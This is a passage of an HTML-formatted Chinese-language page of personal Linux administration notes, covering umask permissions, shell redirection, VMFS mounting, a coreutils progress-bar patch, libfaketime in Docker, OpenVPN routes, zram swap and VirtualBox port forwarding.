 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;当创建目录时候，&lt;code&gt;目录创建后的权限&lt;/code&gt; = &lt;code&gt;默认目录最大权限(777)&lt;/code&gt; - &lt;code&gt;umask 权限&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;umask=0022 --&amp;gt; 777 - 022 = 755(目录权限)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;当创建文件时候，若&lt;code&gt;umask&lt;/code&gt;值所有位数为偶数，则 &lt;code&gt;文件创建后的权限&lt;/code&gt; = &lt;code&gt;默认文件最大权限(666)&lt;/code&gt; - &lt;code&gt;umask权限&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;umask = 0022 --&amp;gt; 666 - 022 = 644(文件权限)&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;当创建文件时候，若&lt;code&gt;umask&lt;/code&gt;值部分或全部为奇数时候，则 &lt;code&gt;文件创建后的权限&lt;/code&gt; = &lt;code&gt;默认文件最大权限(666)&lt;/code&gt; - &lt;code&gt;umask权限&lt;/code&gt; + &lt;code&gt;umask基数位+1&lt;/code&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;umask = 0045 --&amp;gt; 666 - 045 = (621 + 001) = 622&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;umask = 0033 --&amp;gt; 666 - 033 = (633 + 011) = 644&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 class="heading-element" id="输入输出重定向"&gt;&lt;span&gt;输入输出重定向&lt;/span&gt;
 &lt;a href="#%e8%be%93%e5%85%a5%e8%be%93%e5%87%ba%e9%87%8d%e5%ae%9a%e5%90%91" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;h3 class="heading-element" id="文件描述符"&gt;&lt;span&gt;文件描述符&lt;/span&gt;
 &lt;a href="#%e6%96%87%e4%bb%b6%e6%8f%8f%e8%bf%b0%e7%ac%a6" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;文件描述符&lt;/th&gt;
 &lt;th&gt;文件名&lt;/th&gt;
 &lt;th&gt;类型&lt;/th&gt;
 &lt;th&gt;硬件&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;0&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;stdin&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;标准输入文件&lt;/td&gt;
 &lt;td&gt;键盘&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;1&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;stdout&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;标准输出文件&lt;/td&gt;
 &lt;td&gt;显示器&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;&lt;code&gt;2&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;stderr&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;标准错误输出文件&lt;/td&gt;
 &lt;td&gt;显示器&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 class="heading-element" id="标准重定向"&gt;&lt;span&gt;标准重定向&lt;/span&gt;
 &lt;a href="#%e6%a0%87%e5%87%86%e9%87%8d%e5%ae%9a%e5%90%91" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://aimuke.github.io/linux/2019/05/29/redirect/" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://aimuke.github.io/linux/2019/05/29/redirect/&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;类型&lt;/th&gt;
 &lt;th&gt;表现形式&lt;/th&gt;
 &lt;/tr&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
 &lt;td&gt;标准输入重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;0&amp;lt;&lt;/code&gt;或&lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;追加输入重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;0&amp;lt;&amp;lt;&lt;/code&gt;或&lt;code&gt;&amp;lt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;标准输出重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;1&amp;gt;&lt;/code&gt;或&lt;code&gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;标准输出追加重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;1&amp;gt;&amp;gt;&lt;/code&gt;或&lt;code&gt;&amp;gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;标准错误重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;2&amp;gt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;标准错误追加重定向&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;2&amp;gt;&amp;gt;&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;标准错误重定向到标准输出&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;2&amp;gt;&amp;amp;1&lt;/code&gt;，&lt;code&gt;(cmd &amp;gt; /dev/null 2&amp;gt;&amp;amp;1) == (cmd &amp;gt;&amp;amp; /dev/null) == (cmd &amp;amp;&amp;gt; /dev/null)&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 class="heading-element" id="linux-下挂载-esxi-的-vmfs-文件系统"&gt;&lt;span&gt;linux 下挂载 esxi 的 vmfs 文件系统&lt;/span&gt;
 &lt;a href="#linux-%e4%b8%8b%e6%8c%82%e8%bd%bd-esxi-%e7%9a%84-vmfs-%e6%96%87%e4%bb%b6%e7%b3%bb%e7%bb%9f" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;vmfs&lt;/code&gt; 是&lt;code&gt;esxi&lt;/code&gt;的文件系统,物理机使用&lt;code&gt;esxi&lt;/code&gt;虚拟化后硬盘的文件格式就是这个. &lt;code&gt;linux&lt;/code&gt;下可以直接将其挂在到本地
&lt;code&gt;vmfs-tools&lt;/code&gt;是&lt;code&gt;linux&lt;/code&gt;挂载&lt;code&gt;vmfs&lt;/code&gt;的驱动程序(应该也可以挂在&lt;code&gt;vmdk&lt;/code&gt;文件,&lt;em&gt;我没有试过&lt;/em&gt;),默认在&lt;code&gt;ubuntu&lt;/code&gt;上已获得支持,&lt;code&gt;fedora&lt;/code&gt;上可以直接将&lt;code&gt;ubuntu&lt;/code&gt;上的安装程序复制过来也可以直接使用.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://github.com/glandium/vmfs-tools" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://github.com/glandium/vmfs-tools&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 安装后挂载 
vmfs-fuse /dev/sdc1 /mnt/sdc &lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="cp-mv-进度条补丁"&gt;&lt;span&gt;cp mv 进度条补丁&lt;/span&gt;
 &lt;a href="#cp-mv-%e8%bf%9b%e5%ba%a6%e6%9d%a1%e8%a1%a5%e4%b8%81" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;# 注意尽量不要使用 root 用户操作
# 下载coreutils
$ wget http://ftp.gnu.org/gnu/coreutils/coreutils-8.32.tar.xz
$ tar -xJf coreutils-8.32.tar.xz
$ cd coreutils-8.32/

# 下载 github 上的补丁
$ wget https://raw.githubusercontent.com/jarun/advcpmv/master/advcpmv-0.8-8.32.patch
# 打补丁，实现进度条显示
$ patch -p1 -i advcpmv-0.8-8.32.patch
patching file src/copy.c
patching file src/copy.h
patching file src/cp.c
patching file src/mv.c

# 编译安装
$ ./configure
$ make
# 将打补丁生成的cp和mv命令的二进制文件复制到bin目录下
$ sudo cp src/cp /usr/local/bin/cp
$ sudo cp src/mv /usr/local/bin/mv&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="更改docker容器中的时间而不影响宿主机"&gt;&lt;span&gt;更改docker容器中的时间而不影响宿主机&lt;/span&gt;
 &lt;a href="#%e6%9b%b4%e6%94%b9docker%e5%ae%b9%e5%99%a8%e4%b8%ad%e7%9a%84%e6%97%b6%e9%97%b4%e8%80%8c%e4%b8%8d%e5%bd%b1%e5%93%8d%e5%ae%bf%e4%b8%bb%e6%9c%ba" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; git clone https://github.com/wolfcw/libfaketime.git
$&amp;gt; cd libfaketime
$&amp;gt; make 
$&amp;gt; docker cp ./src/libfaketime.so.1 centos:/usr/lib/
$&amp;gt; docker exec -it centos bash 
# 修改为指定时间
$&amp;gt;&amp;gt; export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=&amp;#34;2020-05-01 00:01:00&amp;#34;
# 修改为几天后 
$&amp;gt;&amp;gt; export LD_PRELOAD=/usr/lib/libfaketime.so.1 FAKETIME=&amp;#34;&amp;#43;2d&amp;#34;
# 恢复 
$&amp;gt;&amp;gt; export LD_PRELOAD=&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="ubuntudebian切换shelldashbash"&gt;&lt;span&gt;ubuntu/debian切换shell（dash/bash）&lt;/span&gt;
 &lt;a href="#ubuntudebian%e5%88%87%e6%8d%a2shelldashbash" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;$&amp;gt; dpkg-reconfigure dash
# 弹出窗口选择 &amp;lt;No&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="openvpn-指定路由配置"&gt;&lt;span&gt;openvpn 指定路由配置&lt;/span&gt;
 &lt;a href="#openvpn-%e6%8c%87%e5%ae%9a%e8%b7%af%e7%94%b1%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://blog.csdn.net/joshua317/article/details/120245443" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://blog.csdn.net/joshua317/article/details/120245443&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 在 verb 3 下添加
route-nopull # route-nopull 配置后不会有任何网络请求走openvpn
# 当客户端加入 route-nopull 后,所有出去的访问都不从 Openvpn 出去,但可通过添加 vpn_gateway 参数使部分IP访问走 Openvpn 出去
route 172.16.0.0 255.255.0.0 vpn_gateway 
route 140.143.61.12 255.255.255.255 vpn_gateway&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="svg-背景透明图片"&gt;&lt;span&gt;svg 背景透明图片&lt;/span&gt;
 &lt;a href="#svg-%e8%83%8c%e6%99%af%e9%80%8f%e6%98%8e%e5%9b%be%e7%89%87" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; standalone=&amp;#34;no&amp;#34;?&amp;gt;
&amp;lt;!DOCTYPE svg PUBLIC &amp;#34;-//W3C//DTD SVG 1.1//EN&amp;#34; &amp;#34;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;#34;&amp;gt;
&amp;lt;svg version=&amp;#34;1.1&amp;#34; id=&amp;#34;Layer_1&amp;#34; xmlns=&amp;#34;http://www.w3.org/2000/svg&amp;#34; xmlns:xlink=&amp;#34;http://www.w3.org/1999/xlink&amp;#34; x=&amp;#34;0px&amp;#34; y=&amp;#34;0px&amp;#34; width=&amp;#34;250px&amp;#34; height=&amp;#34;269px&amp;#34; viewBox=&amp;#34;0 0 250 269&amp;#34; enable-background=&amp;#34;new 0 0 250 269&amp;#34; xml:space=&amp;#34;preserve&amp;#34;&amp;gt; 
 &amp;lt;image id=&amp;#34;image0&amp;#34; width=&amp;#34;250&amp;#34; height=&amp;#34;269&amp;#34; x=&amp;#34;0&amp;#34; y=&amp;#34;0&amp;#34;
 href=&amp;#34;data:image/png;base64,&amp;lt;base64 code&amp;gt;&amp;#34; /&amp;gt;
&amp;lt;/svg&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="centos-启用zram服务器内存过低可用于替代swap"&gt;&lt;span&gt;CentOS 启用zram(服务器内存过低，可用于替代swap)&lt;/span&gt;
 &lt;a href="#centos-%e5%90%af%e7%94%a8zram%e6%9c%8d%e5%8a%a1%e5%99%a8%e5%86%85%e5%ad%98%e8%bf%87%e4%bd%8e%e5%8f%af%e7%94%a8%e4%ba%8e%e6%9b%bf%e4%bb%a3swap" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href="https://fedoraproject.org/wiki/Changes/SwapOnZRAM" target="_blank" rel="external nofollow noopener noreferrer"&gt;https://fedoraproject.org/wiki/Changes/SwapOnZRAM&lt;i class="fa-solid fa-external-link-alt fa-fw fa-xs ms-1 text-secondary" aria-hidden="true"&gt;&lt;/i&gt;&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;# 加载内核模块 
# num_devices 是 zRAM模块的参数，zram num_devices=1 表示仅创建一个设备文件，该文件将会保存在设备目录，文件名称是 /dev/zram0。
# 如果 num_devices 的数值不等于 1，内核将会创建多个 zram 文件 /dev/zram{0,1,2,3...}

# 持久化开启/加载 zRAM 模块
$&amp;gt; echo &amp;#34;zram&amp;#34; | sudo tee -a /etc/modules-load.d/zram.conf
$&amp;gt; echo &amp;#34;options zram num_devices=1&amp;#34; | sudo tee -a /etc/modprobe.d/zram.conf

# 持久化 zRAM 配置 disksize: zram(swap)大小(内存的1.5-2倍，内存大于8G，设为8G), comp_algorithm: 压缩算法(fedora 配置 lzo [lzo-rle] lz4 lz4hc 842 zstd，但centos似乎只支持lzo)
$&amp;gt; echo &amp;#39;KERNEL==&amp;#34;zram0&amp;#34;, ATTR{disksize}=&amp;#34;512M&amp;#34;, ATTR{comp_algorithm}=&amp;#34;lzo&amp;#34;, TAG&amp;#43;=&amp;#34;systemd&amp;#34;&amp;#39; | sudo tee /etc/udev/rules.d/99-zram.rules

# 创建systemd单元，自动挂载 zram (zram会自动叠加已经挂载的swap)
$&amp;gt; vim /etc/systemd/system/zram.service
[Unit]
Description=Swap with zram
After=multi-user.target

[Service]
Type=oneshot
RemainAfterExit=true
ExecStartPre=/sbin/mkswap /dev/zram0
ExecStart=/sbin/swapon /dev/zram0
ExecStop=/sbin/swapoff /dev/zram0

[Install]
WantedBy=multi-user.target

# 重启服务器
echo &amp;#34;512M&amp;#34; | sudo tee /sys/block/zram0/disksize
echo &amp;#34;lzo&amp;#34; | sudo tee /sys/block/zram0/comp_algorithm&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="virtualbox-nat端口映射配置"&gt;&lt;span&gt;virtualbox NAT端口映射配置&lt;/span&gt;
 &lt;a href="#virtualbox-nat%e7%ab%af%e5%8f%a3%e6%98%a0%e5%b0%84%e9%85%8d%e7%bd%ae" class="heading-mark"&gt;
 &lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"&gt;&lt;/path&gt;&lt;/svg&gt;
 &lt;/a&gt;
&lt;/h2&gt;&lt;p&gt;&lt;code&gt;windows&lt;/code&gt; 和 &lt;code&gt;linux&lt;/code&gt;命令应一致(只测试过&lt;code&gt;windows&lt;/code&gt;)，用于快速批量映射&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# VBoxManage natnetwork modify --netname &amp;#34;10.0.2.0/24&amp;#34; --port-forward-4 &amp;#34;名称:协议:[主机ip]:主机端口:[虚拟机ip]:虚拟机端口&amp;#34;
VBoxManage natnetwork modify --netname &amp;#34;10.0.2.0/24&amp;#34; --port-forward-4 &amp;#34;172.16.10.230-2222:tcp:[172.16.10.230]:2222:[10.0.2.230]:2222&amp;#34;&lt;/code&gt;&lt;/pre&gt;&lt;h2 class="heading-element" id="单位换算"&gt;&lt;span&gt;单位换算&lt;/span&gt;
 &lt;a href="#%e5%8d%95%e4%bd%8d%e6%8d%a2%e7%ae%97" class="heading-mark"&gt;
